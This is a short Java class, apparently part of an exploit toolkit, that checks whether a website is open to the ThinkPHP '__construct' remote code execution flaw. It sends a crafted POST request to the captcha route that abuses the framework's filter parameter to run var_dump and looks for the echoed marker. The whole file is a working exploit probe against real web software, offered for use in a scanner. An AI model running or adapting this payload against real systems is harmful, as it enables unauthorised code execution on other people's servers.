package com.leishianquan.exp;

import com.leishianquan.model.BasePayload;
import com.leishianquan.util.Dialog;
import com.leishianquan.util.HttpTool;

public class thinkphp_construct_code_exec implements BasePayload {
    private static final String CheckStr="11111";

    public boolean checkVUL(String url) throws Exception{

        try {
            String test_result = HttpTool.postHttpRequest(url + "/index.php?s=captcha" , "utf-8","application/x-www-form-urlencoded","_method=__construct&filter%5B%5D=var_dump&method=get&server%5BREQUEST_METHOD%5D="+CheckStr);
            if(test_result.contains(CheckStr)){
                return true;}

        }  catch (Exception e) {
//            Dialog.alert_Dialog("txf提示你",null,"连接超时");

        }

        return false;
    }


}